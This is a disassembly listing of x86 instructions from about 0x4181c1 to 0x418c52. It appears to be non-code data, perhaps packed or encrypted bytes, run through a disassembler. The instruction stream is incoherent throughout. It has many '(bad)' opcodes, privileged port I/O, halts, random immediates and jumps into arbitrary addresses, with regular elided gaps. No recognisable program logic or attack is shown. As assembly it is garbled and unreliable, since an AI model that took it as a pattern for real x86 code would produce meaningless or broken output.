  4181c1:	mov    BYTE PTR [edi-0x7],ch
  4181c4:	cmc    
  4181c5:	sbb    eax,0xf2f93382
  4181ca:	fs push 0x617c28a1
  4181d0:	or     esi,edx
  4181d2:	ja     0x418184
  4181d4:	xor    BYTE PTR [esi+0x48],al
  4181d7:	add    dl,cl
  4181d9:	sbb    ecx,edx
  4181db:	adc    al,0x63
  4181dd:	jecxz  0x41817f
  4181df:	xchg   edx,eax
  4181e0:	in     eax,dx
  4181e1:	ret    0xa266
  4181e4:	mov    eax,0x33b3bc41
  4181e9:	jp     0x41817f
  4181eb:	cmp    bh,ch
  4181ed:	cmp    DWORD PTR [ecx],edx
  4181ef:	test   eax,0xb9f07fbf
  4181f4:	fldcw  WORD PTR [edi+eax*2+0x31]
  4181f8:	xchg   ebp,eax
  4181f9:	xchg   ebx,eax
  4181fa:	leave  
  4181fb:	push   cs
  4181fc:	je     0x41818a
  4181fe:	xor    eax,0x9b5c33bd
  418203:	inc    esp
  418204:	dec    ebp
  418205:	cmc    
  418206:	jnp    0x41826c
  418208:	cmp    cl,cl
  41820a:	fcom   DWORD PTR ds:0xf10e7ddf
  418210:	out    0x0,al
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x9752b8d6
  418282:	loopne 0x41826c
  418284:	mov    ebp,0x50000ff
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR [ecx+0x5986e333],al
  418291:	xor    eax,0x9e232e63
  418296:	xor    DWORD PTR [ecx-0x3a68cf23],ebp
  41829c:	mov    bl,0xb3
  41829e:	loopne 0x418314
  4182a0:	popf   
  4182a1:	scas   al,BYTE PTR es:[edi]
  4182a2:	push   ds
  4182a3:	adc    ebx,edx
  4182a5:	lods   al,BYTE PTR ds:[esi]
  4182a6:	fmul   QWORD PTR [ebp+0x5a009947]
  4182ac:	sub    al,0xcd
  4182ae:	enter  0x73c9,0xb4
  4182b2:	ins    DWORD PTR es:[edi],dx
  4182b3:	int    0x1f
  4182b5:	sub    eax,0xb4952f6a
  4182ba:	sub    DWORD PTR [ebx],edi
  4182bc:	mov    bl,0xe4
  4182be:	xchg   ebx,eax
  4182bf:	xor    eax,0x9a301535
  4182c4:	adc    DWORD PTR [esi+eax*1+0x31],0x15
  4182c9:	in     al,dx
  4182ca:	jns    0x418275
  4182cc:	mov    eax,ds:0xf4817a53
  4182d1:	out    dx,eax
  4182d2:	rol    ebp,cl
  4182d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182d5:	lahf   
  4182d6:	fs mov bh,0xae
  4182d9:	adc    BYTE PTR [esi],al
  4182db:	rcr    BYTE PTR [ebp+0x5b7abc37],cl
  4182e1:	mov    ds:0x3da026fb,al
  4182e6:	cli    
  4182e7:	stc    
  4182e8:	or     cl,bl
  4182ea:	xor    dl,BYTE PTR [edi+0x2d]
  4182ed:	dec    ebp
  4182ee:	fist   DWORD PTR [edi-0x69]
  4182f1:	ficomp WORD PTR [ebp-0x78]
  4182f4:	adc    BYTE PTR [ebp-0x49],dh
  4182f7:	aaa    
  4182f8:	(bad)  
  4182f9:	mov    esi,0x9173d94f
  4182fe:	pop    ebp
  4182ff:	dec    esi
  418300:	fwait
  418301:	adc    ebx,ebp
  418303:	out    dx,al
  418304:	jbe    0x4182bf
  418306:	inc    ecx
  418307:	push   esi
  418308:	retf   
  418309:	stos   BYTE PTR es:[edi],al
  41830a:	mov    dh,0xff
  41830c:	lods   al,BYTE PTR ds:[esi]
  41830d:	push   esi
  41830e:	or     al,0x45
  418310:	jo     0x418338
  418312:	xlat   BYTE PTR ds:[ebx]
  418313:	dec    ebp
  418314:	mov    esi,0x426a1063
  418319:	into   
  41831a:	and    eax,0x836be42a
  41831f:	push   esi
  418320:	cdq    
  418321:	ins    BYTE PTR es:[edi],dx
  418322:	inc    ebx
  418323:	or     DWORD PTR [edx],edx
  418325:	mov    dh,0xf6
  418327:	and    BYTE PTR [ecx+0x1e],ah
  41832a:	rcl    bh,0x44
  41832d:	and    al,bh
  41832f:	and    al,0xad
  418331:	and    dl,BYTE PTR [ebx-0x2ef332ee]
  418337:	pop    ds
  418338:	pop    eax
  418339:	sahf   
  41833a:	mov    ds:0xd72f63fe,al
  41833f:	jns    0x418351
  418341:	sbb    eax,edi
  418343:	sub    BYTE PTR ss:[esp+ecx*8+0x67],0x60
  418349:	xchg   ebp,eax
  41834a:	ins    DWORD PTR es:[edi],dx
  41834b:	inc    edx
  41834c:	push   0x89256b3a
  418351:	mov    al,ds:0xe91119f0
  418356:	rcr    BYTE PTR [esi+0x414344ff],1
  41835c:	scas   al,BYTE PTR es:[edi]
  41835d:	xor    edi,DWORD PTR [ebx]
  41835f:	cmp    eax,0x6f44477f
  418364:	inc    ebp
  418365:	fs sahf 
  418367:	fild   WORD PTR [esi+0x45]
  41836a:	sbb    al,BYTE PTR [ebx-0x62]
  41836d:	xchg   edx,eax
  41836e:	lds    esi,FWORD PTR [ecx-0x4]
  418371:	pop    es
  418372:	ret    
  418373:	int3   
  418374:	stos   BYTE PTR es:[edi],al
  418375:	or     ecx,esp
  418377:	loopne 0x4183b1
  418379:	jg     0x4183c6
  41837b:	add    edi,edi
  41837d:	push   ebx
  41837e:	sbb    al,0x8
  418381:	and    bh,dl
  418383:	or     DWORD PTR [ebp-0x11e31bc9],0x1a
  41838a:	neg    DWORD PTR ds:0xe04bcc42
  418390:	rol    DWORD PTR [eax],1
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	push   ebx
  418401:	or     ch,BYTE PTR [edx+0x100c28a]
  418407:	add    BYTE PTR ds:0xfb000001,al
  41840d:	jb     0x4183fe
  41840f:	push   esi
  418410:	addr16 pop ebp
  418412:	mov    edi,0xe3e0b30c
  418417:	inc    edx
  418418:	jmp    0xb4fa7286
  41841d:	lahf   
  41841e:	xor    BYTE PTR [ecx+edx*2-0x2a],dl
  418422:	dec    esp
  418423:	(bad)  
  418424:	mov    al,ds:0x76c16bba
  418429:	in     eax,0x7b
  41842b:	test   BYTE PTR [edx],cl
  41842d:	popa   
  41842e:	(bad)  
  41842f:	lea    edx,[edx-0x612e714d]
  418435:	and    DWORD PTR [ebx],0x782df064
  41843b:	pop    ebp
  41843c:	sub    BYTE PTR [ecx+ebp*1+0x2c],bl
  418440:	xor    ebx,edx
  418442:	mov    ebp,0xc09ad776
  418447:	inc    ebx
  418448:	or     al,0x5
  41844a:	ss je  0x4184ac
  41844d:	das    
  41844e:	daa    
  41844f:	cmp    DWORD PTR [ecx],esi
  418451:	mul    ah
  418453:	mov    dh,0x97
  418455:	sub    eax,0xa6acb56c
  41845a:	xchg   edi,eax
  41845b:	fsubrp st(0),st
  41845d:	into   
  41845e:	jl     0x418463
  418460:	adc    dh,BYTE PTR [ebp+ebx*1+0x1f]
  418464:	shl    edx,0xe1
  418467:	mov    ah,0xff
  418469:	push   edx
  41846a:	jle    0x418471
  41846c:	mov    BYTE PTR [ebx-0x7d],bh
  41846f:	pop    edi
  418470:	dec    ecx
  418471:	ss mov edi,0x992b30f
  418477:	xor    DWORD PTR [ebx-0x3c],eax
  41847a:	pop    edi
  41847b:	or     BYTE PTR [ebx-0x1c],0x10
  41847f:	repz inc edi
  418481:	call   0x17eb0dc4
  418486:	leave  
  418487:	mov    ah,0xfd
  418489:	adc    DWORD PTR [ebp-0x54],edi
  41848c:	sbb    DWORD PTR cs:[ebp+eiz*8+0x64],0x44
  418492:	mov    ah,0xa5
  418494:	mov    al,ds:0x2ba2c88c
  418499:	jbe    0x4184c6
  41849b:	mov    ds:0x864f3000,eax
  4184a0:	sti    
  4184a1:	add    al,0x3b
  4184a3:	ror    BYTE PTR [ebx*4+0x5c436967],1
  4184aa:	ins    BYTE PTR es:[edi],dx
  4184ab:	repz std 
  4184ad:	jecxz  0x418436
  4184af:	bound  ebx,QWORD PTR [edx+edi*8]
  4184b2:	push   edi
  4184b3:	fisub  DWORD PTR [ecx]
  4184b5:	iret   
  4184b6:	popaw  
  4184b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b9:	pop    edx
  4184ba:	push   esp
  4184bb:	popf   
  4184bc:	pop    ebp
  4184bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184be:	jne    0x4184a4
  4184c0:	into   
  4184c1:	fstp   QWORD PTR [ebp-0x20ce460a]
  4184c7:	or     DWORD PTR [ebp+0x6eb003a6],ebx
  4184cd:	(bad)  
  4184ce:	retf   
  4184cf:	add    BYTE PTR [ecx+0x76ece0bf],ch
  4184d5:	(bad)  
  4184d6:	push   0xffffff94
  4184d8:	sub    DWORD PTR [ebp-0x70],esp
  4184db:	stos   DWORD PTR es:[edi],eax
  4184dc:	push   es
  4184dd:	dec    esi
  4184de:	xor    edi,DWORD PTR [ecx+eiz*1-0x1423faab]
  4184e5:	dec    DWORD PTR [ecx+0x463fe514]
  4184eb:	inc    edi
  4184ec:	imul   edx,DWORD PTR [esi-0x7a],0x6f
  4184f0:	xchg   esp,eax
  4184f1:	xchg   esp,eax
  4184f2:	icebp  
  4184f3:	mov    al,0xd1
  4184f5:	inc    BYTE PTR [edx-0x68]
  4184f8:	loop   0x41855a
  4184fa:	xor    dh,BYTE PTR [esi-0x1]
  4184fd:	cwde   
  4184fe:	(bad)  
  4184ff:	sbb    esi,DWORD PTR es:[esi+edi*2]
  418503:	add    eax,0x8efec8d3
  418508:	or     ebp,DWORD PTR [ebp+eiz*2+0x2d]
  41850c:	(bad)  
  41850d:	and    edi,DWORD PTR [ebx+0x24]
  418510:	inc    BYTE PTR [eax]
	...
  418572:	add    BYTE PTR [eax],al
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	cmp    BYTE PTR [ebp-0x1c],0xf4
  418584:	mov    DWORD PTR [ecx],0x1050001
  41858a:	add    BYTE PTR [eax],al
  41858c:	sub    dl,0x93
  41858f:	jbe    0x418540
  418591:	sar    BYTE PTR [esp+ecx*8+0x446f503b],cl
  418598:	sub    DWORD PTR [ebx-0x32c1eb75],ebx
  41859e:	(bad)  
  41859f:	loop   0x41855a
  4185a1:	fcomp  QWORD PTR [edi]
  4185a3:	pop    es
  4185a4:	repnz push 0x38
  4185a7:	popa   
  4185a8:	(bad)  
  4185a9:	pop    ebp
  4185aa:	pop    ds
  4185ab:	sbb    BYTE PTR [edx],0x15
  4185ae:	push   eax
  4185af:	fstp   st(7)
  4185b1:	jp     0x41860b
  4185b3:	test   al,0x3e
  4185b5:	add    al,0xf8
  4185b7:	les    eax,FWORD PTR [esi+0x44]
  4185ba:	mov    ds:0xfcc30e18,al
  4185bf:	cmp    eax,0xe1bbf85d
  4185c4:	pop    ds
  4185c5:	pop    eax
  4185c6:	or     eax,0x740c6a69
  4185cb:	sub    DWORD PTR [ecx+0xf],edx
  4185ce:	jle    0x4185b6
  4185d0:	mov    cl,0x7
  4185d2:	mov    DWORD PTR [esi-0x16d42b6d],esp
  4185d8:	dec    edx
  4185d9:	pop    ds
  4185da:	add    eax,0xab474617
  4185df:	xor    eax,0x370de5e1
  4185e4:	pop    es
  4185e5:	stc    
  4185e6:	es cmp bl,ch
  4185e9:	adc    al,0xe2
  4185eb:	hlt    
  4185ec:	mov    ds:0xef0fd053,al
  4185f1:	je     0x41858a
  4185f3:	mov    BYTE PTR [ebp+0x11bcb1ba],ch
  4185f9:	daa    
  4185fa:	xor    ch,al
  4185fc:	pushf  
  4185fd:	pop    esp
  4185fe:	sbb    DWORD PTR [eax-0x228bd64f],esp
  418604:	ins    BYTE PTR es:[edi],dx
  418605:	add    edx,DWORD PTR [ebx+0xca3a665]
  41860b:	sbb    ecx,ecx
  41860d:	lds    eax,FWORD PTR [edi]
  41860f:	es adc dh,dh
  418612:	sbb    esi,DWORD PTR [edi]
  418614:	jg     0x41865a
  418616:	aaa    
  418617:	loope  0x418642
  418619:	pushf  
  41861a:	mov    edi,0xb1396833
  41861f:	mov    dl,0x56
  418621:	loope  0x4185ea
  418623:	mov    WORD PTR [edx+0x55],?
  418626:	clc    
  418627:	dec    eax
  418628:	mov    dh,0x1c
  41862a:	xchg   edi,eax
  41862b:	jle    0x4185ae
  41862d:	in     al,0x7f
  41862f:	lock and ecx,ebp
  418632:	sti    
  418633:	push   edi
  418634:	das    
  418635:	test   DWORD PTR [eax],edi
  418637:	scas   al,BYTE PTR es:[edi]
  418638:	xchg   BYTE PTR [ecx-0x30],ah
  41863b:	mov    edi,0xb4cee8c5
  418640:	icebp  
  418641:	test   al,0x9f
  418643:	out    dx,al
  418644:	outs   dx,BYTE PTR ds:[esi]
  418645:	adc    eax,0xfc192481
  41864a:	out    0x47,al
  41864c:	adc    edi,DWORD PTR [ebx]
  41864e:	loopne 0x41864f
  418650:	fsubr  st(7),st
  418652:	lock ret 0xe156
  418656:	(bad)  
  418657:	enter  0x64b6,0xf5
  41865b:	mov    eax,0xce13ec73
  418660:	jg     0x418668
  418662:	mov    ebx,0x948c66ca
  418667:	and    ebx,DWORD PTR [esi+0x78c24e96]
  41866d:	(bad)  
  41866e:	imul   edi
  418670:	pop    esi
  418671:	xchg   edi,eax
  418672:	out    0x4d,al
  418674:	push   esi
  418675:	or     ecx,ebx
  418677:	sti    
  418678:	icebp  
  418679:	adc    eax,0x913f3c87
  41867e:	lock mov al,ds:0x3c941d66
  418685:	mov    WORD PTR [ebx+0x68effb2d],es
  41868b:	leave  
  41868c:	into   
  41868d:	xchg   DWORD PTR [ebx+0x69],esp
  418690:	sub    eax,DWORD PTR [eax]
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	mov    bl,0xd5
  418702:	test   al,0x23
  418704:	int3   
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0x1a000001,al
  41870d:	add    ah,BYTE PTR [ebx+0x408ff110]
  418713:	pop    eax
  418714:	je     0x76eb2589
  41871a:	push   esi
  41871b:	inc    ebx
  41871c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41871d:	and    BYTE PTR [edi+ecx*2],cl
  418720:	cmp    dl,BYTE PTR [ebx-0x30f96101]
  418726:	mov    dh,0x26
  418728:	test   DWORD PTR [edi],ebx
  41872a:	in     eax,0x90
  41872c:	mov    bh,0x4d
  41872e:	xchg   ebx,eax
  41872f:	mov    dh,0xc6
  418731:	inc    esp
  418732:	sub    DWORD PTR [ecx+0x162b5b0e],edi
  418738:	sbb    ecx,DWORD PTR ds:0x58730b98
  41873e:	cmp    eax,0x8c7a19a
  418743:	std    
  418744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418745:	push   ds
  418746:	and    al,0x45
  418748:	mov    cl,0x2e
  41874a:	inc    esi
  41874b:	nop
  41874c:	call   0x5c548ee6
  418751:	xor    al,BYTE PTR [ebx+0x26]
  418754:	pop    esi
  418755:	pop    ebx
  418756:	mov    edx,DWORD PTR ss:[ecx-0x40]
  41875a:	cmp    eax,DWORD PTR [ebx+0x76]
  41875d:	js     0x418728
  41875f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418760:	push   0x1fa86a49
  418765:	shr    DWORD PTR [eax],0xb3
  418768:	dec    esi
  418769:	stos   DWORD PTR es:[edi],eax
  41876a:	xchg   edx,esp
  41876c:	(bad)  
  41876d:	or     eax,0x4bdf005e
  418772:	push   es
  418773:	lods   eax,DWORD PTR ds:[esi]
  418774:	xor    ch,BYTE PTR [ebx+0x430afa83]
  41877a:	iret   
  41877b:	rcr    BYTE PTR [eax-0x627ce2b6],cl
  418781:	pop    ss
  418782:	mov    al,ds:0xfa59c810
  418787:	inc    ecx
  418788:	cmp    cl,BYTE PTR [eax-0x64]
  41878b:	inc    esp
  41878c:	xchg   esp,eax
  41878d:	sub    bl,BYTE PTR [edi-0x42b0a248]
  418793:	xchg   ecx,eax
  418794:	inc    DWORD PTR [esi-0x76]
  418797:	adc    esi,esp
  418799:	repnz lock ins BYTE PTR es:[edi],dx
  41879c:	pop    eax
  41879d:	scas   al,BYTE PTR es:[edi]
  41879e:	pop    eax
  41879f:	movups xmm7,XMMWORD PTR ds:0x7f34b2b6
  4187a6:	cmp    BYTE PTR [ebx+0x37941d84],bh
  4187ac:	shl    DWORD PTR ds:0x88b8dc65,cl
  4187b2:	fstp   TBYTE PTR [edx-0x352f9743]
  4187b8:	jecxz  0x4187c9
  4187ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187bb:	cmc    
  4187bc:	add    DWORD PTR [ecx],esi
  4187be:	aam    0x8f
  4187c0:	add    cl,dl
  4187c2:	mov    ah,0xa5
  4187c4:	jnp    0x4187f9
  4187c6:	icebp  
  4187c7:	hlt    
  4187c8:	add    eax,0xf9e38b3c
  4187cd:	fisttp WORD PTR [edx+0x2c46a729]
  4187d3:	fild   DWORD PTR ds:0x55031d6f
  4187d9:	adc    BYTE PTR [ecx-0x64e42bab],ch
  4187df:	test   eax,0x51818fe0
  4187e4:	inc    esp
  4187e5:	push   edi
  4187e6:	jle    0x418824
  4187e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187e9:	mov    ecx,0x8087650d
  4187ee:	mov    eax,ds:0x75a141ae
  4187f3:	xchg   ecx,eax
  4187f4:	repz jl 0x418872
  4187f7:	(bad)  
  4187f8:	imul   BYTE PTR [ebp-0xab93f6b]
  4187fe:	out    0x40,al
  418800:	out    0xfc,eax
  418802:	rcr    BYTE PTR [eax+0x6c0a1307],cl
  418808:	mov    dh,0xf1
  41880a:	loope  0x418849
  41880c:	ret    
  41880d:	inc    ebx
  41880e:	push   es
  41880f:	dec    ecx
  418810:	xor    al,BYTE PTR [eax]
	...
  418872:	add    BYTE PTR [eax],al
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x189c3acd]
  418881:	sar    BYTE PTR [ebp+0x37],1
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0x32000001
  41888d:	bnd jns 0x418902
  418890:	cmp    al,0x56
  418892:	pop    ebx
  418893:	fs out 0x92,eax
  418896:	aas    
  418897:	mov    DWORD PTR [ebp-0x2b6736f0],edi
  41889d:	sub    BYTE PTR [eax],dh
  41889f:	sbb    al,BYTE PTR [eax-0x3b32e9a2]
  4188a5:	dec    ebx
  4188a6:	dec    esi
  4188a7:	call   0x7c2d3536
  4188ac:	(bad)  
  4188ad:	cmp    eax,ecx
  4188af:	push   0x1c1c734e
  4188b4:	ins    DWORD PTR es:[edi],dx
  4188b5:	sub    al,0xea
  4188b7:	pop    esp
  4188b8:	aas    
  4188b9:	(bad)  
  4188bb:	jo     0x4188bb
  4188bd:	cmp    ebp,DWORD PTR [ecx+0x4e]
  4188c0:	pushf  
  4188c1:	and    ah,BYTE PTR [edi]
  4188c3:	jmp    0x8d4c:0x1fbdcb87
  4188ca:	test   DWORD PTR [ebx],esp
  4188cc:	pushf  
  4188cd:	rep outs dx,BYTE PTR ds:[esi]
  4188cf:	xlat   BYTE PTR ds:[ebx]
  4188d0:	sbb    al,0xf2
  4188d2:	xchg   esp,eax
  4188d3:	out    dx,al
  4188d4:	out    0x3b,al
  4188d6:	xor    bl,cl
  4188d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188d9:	inc    esp
  4188da:	push   ss
  4188db:	add    DWORD PTR [ebx+0x17],eax
  4188de:	jle    0x418941
  4188e0:	sbb    bh,ch
  4188e2:	enter  0x1712,0x93
  4188e6:	add    al,0xe4
  4188e8:	call   DWORD PTR ds:0x4bbc6a28
  4188ee:	sbb    BYTE PTR [ecx-0x72],dl
  4188f1:	add    BYTE PTR [edx-0x48ad4e8f],bh
  4188f7:	out    dx,eax
  4188f8:	(bad)  
  4188f9:	test   ebp,0xb4539eaa
  4188ff:	mov    al,ds:0xe5189325
  418904:	cmp    eax,0x71540bf8
  418909:	mov    ss,esp
  41890b:	test   cl,ah
  41890d:	xor    edx,DWORD PTR [edi+eax*4-0x58e77ee8]
  418914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418915:	and    ebp,DWORD PTR [ecx-0x3b4ecc72]
  41891b:	adc    DWORD PTR [edx],ebx
  41891d:	add    ecx,ebx
  41891f:	push   cs
  418920:	fbld   TBYTE PTR [eax-0x5fdf2311]
  418926:	addr16 push ecx
  418928:	and    al,BYTE PTR [esi+0x6535bb7f]
  41892e:	out    0x4b,al
  418930:	int    0xc9
  418932:	popa   
  418933:	test   eax,0x5dfdc7e1
  418938:	shl    BYTE PTR [esi-0x68c50433],0xac
  41893f:	(bad)  
  418940:	test   DWORD PTR [eax+edi*1+0x224e9e26],ebx
  418947:	jle    0x4188de
  418949:	push   eax
  41894a:	stc    
  41894b:	jp     0x41898c
  41894d:	sar    BYTE PTR [edi+ecx*1-0x1f],cl
  418951:	mov    edx,DWORD PTR [ecx+0x405cccf7]
  418957:	mov    dl,0x2d
  418959:	enter  0x10d7,0x15
  41895d:	push   ebx
  41895e:	mul    DWORD PTR [edi+0x34]
  418961:	xor    esp,ebx
  418963:	loope  0x4189dc
  418965:	hlt    
  418966:	mov    bh,0x9c
  418968:	iret   
  418969:	ds inc esi
  41896b:	outs   dx,BYTE PTR ds:[esi]
  41896c:	xor    DWORD PTR ss:[esi+0xa0f10e7],eax
  418973:	repz les esp,FWORD PTR [eax-0x10d5d54c]
  41897a:	imul   edi,DWORD PTR [ebx+edi*8],0xffffffaf
  41897e:	xchg   ecx,eax
  41897f:	fs (bad) 
  418981:	mov    ecx,0x992bd425
  418986:	in     eax,0xe3
  418988:	inc    edx
  418989:	mov    esp,0xaf1a9c18
  41898e:	xor    BYTE PTR [ebx],ah
  418990:	or     al,BYTE PTR [eax]
	...
  4189f2:	add    BYTE PTR [eax],al
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xb14e7169
  418a03:	(bad)  
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0x7d000001,al
  418a0d:	retf   0x9e7f
  418a10:	je     0x418a1a
  418a12:	icebp  
  418a13:	jmp    0x57b196b
  418a18:	(bad)  
  418a19:	daa    
  418a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1b:	cmp    ch,BYTE PTR [ebp+0x723212f7]
  418a21:	add    eax,0x8b97adef
  418a26:	mov    WORD PTR [edx+esi*8],ds
  418a29:	adc    BYTE PTR [ebx-0x25788ffe],0x8b
  418a30:	test   al,ch
  418a32:	jle    0x418aa8
  418a34:	popa   
  418a35:	or     BYTE PTR [edx+ebx*2-0x2cb2d87c],dh
  418a3c:	retf   
  418a3d:	data16 and BYTE PTR [ebx-0x30],ah
  418a41:	mov    ?,WORD PTR [edx+0x7f]
  418a44:	arpl   WORD PTR [eax+ebp*1+0x40],ax
  418a48:	dec    ebp
  418a49:	mov    ch,BYTE PTR [ecx]
  418a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a4c:	out    0xd4,eax
  418a4e:	iret   
  418a4f:	hlt    
  418a50:	sub    BYTE PTR [ecx-0x7041eef6],bh
  418a56:	retf   0x8ef8
  418a59:	pusha  
  418a5a:	xor    BYTE PTR [ecx+0x6a5644b1],bh
  418a60:	test   al,0x31
  418a62:	dec    edx
  418a63:	imul   esp,DWORD PTR [edi],0xca0f87cd
  418a69:	jae    0x4189eb
  418a6b:	or     BYTE PTR ds:0xd3a1e0d,cl
  418a71:	jecxz  0x4189fb
  418a73:	loop   0x418a4c
  418a75:	pop    ss
  418a76:	mov    esp,0xdb49fe8c
  418a7b:	lock inc ebx
  418a7d:	shl    BYTE PTR [edi+0x49],cl
  418a80:	ds ret 
  418a82:	lock and DWORD PTR [edx+0x6c6c3419],ecx
  418a89:	inc    ebx
  418a8a:	push   cs
  418a8b:	add    edi,DWORD PTR [esi+0x5e]
  418a8e:	or     bh,0xad
  418a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a92:	lea    esi,[ebx-0x6ccfadf7]
  418a98:	imul   esi,DWORD PTR [edi+0x59],0xe462162e
  418a9f:	mov    ebp,0x8b2d5f27
  418aa4:	mov    ecx,0xbc027ecf
  418aa9:	fdivrp st(3),st
  418aab:	ror    BYTE PTR [edi-0x5f],0x2e
  418aaf:	jmp    FWORD PTR [eax+edi*1+0x6879c5e0]
  418ab6:	mov    DWORD PTR [ebx],ebp
  418ab8:	mov    ecx,0x676ae6e2
  418abd:	retf   
  418abe:	adc    BYTE PTR [edx+0x4aed22c3],ch
  418ac4:	dec    ebp
  418ac5:	mov    ecx,0xa058843
  418aca:	or     eax,DWORD PTR [edx+esi*2+0xdfa8fbb]
  418ad1:	icebp  
  418ad2:	inc    ebp
  418ad3:	imul   esi,DWORD PTR [esi+0x4],0x7b978186
  418ada:	icebp  
  418adb:	lock stos BYTE PTR es:[edi],al
  418add:	add    eax,0xdd70844c
  418ae3:	fstp   DWORD PTR [ecx-0x3736144]
  418ae9:	je     0x418ac7
  418aeb:	jno    0x418b6b
  418aed:	or     dl,0x67
  418af0:	out    0x89,al
  418af2:	sub    al,0x14
  418af4:	(bad)  ss:[edi]
  418af7:	repz loopne 0x418af9
  418afa:	or     bl,BYTE PTR [eax-0x510fd478]
  418b00:	ror    BYTE PTR [edi-0x7f],0x2c
  418b04:	jo     0x418b4c
  418b06:	sbb    ebp,DWORD PTR [ebx-0x99ae04]
  418b0c:	or     ecx,DWORD PTR [ecx+0xed9fc8]
	...
  418b72:	add    BYTE PTR [eax],al
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xf6
  418b81:	mov    ch,dl
  418b83:	(bad)  
  418b84:	fild   DWORD PTR ds:0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	jp     0x418bb4
  418b8e:	dec    esi
  418b8f:	stc    
  418b90:	pop    DWORD PTR [ebp+0x18]
  418b93:	cmp    al,0x9e
  418b95:	add    ah,BYTE PTR [eax]
  418b97:	and    eax,0x60d36e59
  418b9c:	std    
  418b9d:	repz mov edx,0x9f556bd6
  418ba3:	xchg   ebp,eax
  418ba4:	repnz push eax
  418ba6:	sbb    esp,DWORD PTR [ecx]
  418ba8:	jge    0x418be3
  418baa:	popf   
  418bab:	(bad)  
  418bac:	out    dx,al
  418bad:	popf   
  418bae:	jmp    0x418bbb
  418bb0:	adc    esp,DWORD PTR [ebx]
  418bb2:	das    
  418bb3:	pushf  
  418bb4:	popf   
  418bb5:	push   esp
  418bb6:	repz aad 0x81
  418bb9:	les    esi,FWORD PTR [esi+edx*2+0x32]
  418bbd:	mov    esp,0x9499ad15
  418bc2:	push   ss
  418bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bc4:	ja     0x418be3
  418bc6:	inc    edi
  418bc7:	add    BYTE PTR [edx+0x39],dh
  418bca:	mov    cl,BYTE PTR [ecx+edx*4]
  418bcd:	dec    eax
  418bce:	inc    edi
  418bcf:	push   DWORD PTR [edx+0x33fc08d1]
  418bd5:	cmp    eax,0x534e0b13
  418bda:	ror    DWORD PTR [ebx],0x4
  418bdd:	and    bh,BYTE PTR [esp+eiz*4+0xb]
  418be1:	stos   BYTE PTR es:[edi],al
  418be2:	stos   BYTE PTR es:[edi],al
  418be3:	adc    DWORD PTR [eax+0x71],edi
  418be6:	jne    0x418bd1
  418be8:	pop    esp
  418be9:	daa    
  418bea:	add    al,0xee
  418bec:	sbb    edi,ebx
  418bee:	ds hlt 
  418bf0:	fild   QWORD PTR [esi+0x18]
  418bf3:	and    bh,bh
  418bf5:	dec    ecx
  418bf6:	mov    cl,0x91
  418bf8:	and    eax,0x495f48b8
  418bfd:	mov    BYTE PTR [ebx-0x1e],bh
  418c00:	sub    al,0xf
  418c02:	jg     0x418c7d
  418c04:	adc    eax,0xdebf5336
  418c09:	nop
  418c0a:	mov    al,ds:0xe99f2ad1
  418c0f:	and    ch,BYTE PTR [edx+ebx*1+0x75a5638c]
  418c16:	scas   al,BYTE PTR es:[edi]
  418c17:	shl    BYTE PTR [edx-0x680196dc],0x56
  418c1e:	add    ch,BYTE PTR [ebx-0x292d6d1]
  418c24:	dec    ecx
  418c25:	in     al,0xff
  418c27:	imul   ecx,DWORD PTR [edx],0x1dffe152
  418c2d:	stos   BYTE PTR es:[edi],al
  418c2e:	bound  edx,QWORD PTR [edi+0x192794d8]
  418c34:	jmp    0x93ea67e7
  418c39:	jge    0x418bfa
  418c3b:	aam    0x52
  418c3d:	add    DWORD PTR [ebx],0x7b
  418c40:	aad    0x92
  418c42:	sbb    BYTE PTR [ebp-0x34],bh
  418c45:	arpl   WORD PTR [edi-0x2f9de0df],sp
  418c4b:	cli    
  418c4c:	int    0x4
  418c4e:	ja     0x418bfb
  418c50:	mov    WORD PTR [edi],gs
  418c52:	sub    esp,edi
